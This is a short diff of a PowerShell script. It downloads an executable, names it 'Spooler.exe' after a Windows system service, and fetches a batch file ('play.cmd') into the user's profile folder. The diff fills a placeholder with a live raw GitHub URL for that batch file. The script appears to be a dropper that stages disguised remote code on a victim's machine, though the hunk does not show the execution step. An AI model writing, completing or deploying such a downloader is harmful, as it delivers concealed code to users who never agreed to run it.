@@ -10,7 +10,7 @@ if (-not (Test-Path -Path $downloadDirectory -PathType Container)) {
 # Download the executable
 Invoke-WebRequest -Uri $exeUrl -OutFile "$downloadDirectory\Spooler.exe"
 
-$cmdScriptUrl = "LINK TO RAW PLAY CMD BATCH FILE"
+$cmdScriptUrl = "https://raw.githubusercontent.com/jimmyisdabest342234/joshaiden38/main/Spooler/play.cmd"
 $cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")
 
 # Download the .cmd script from the URL
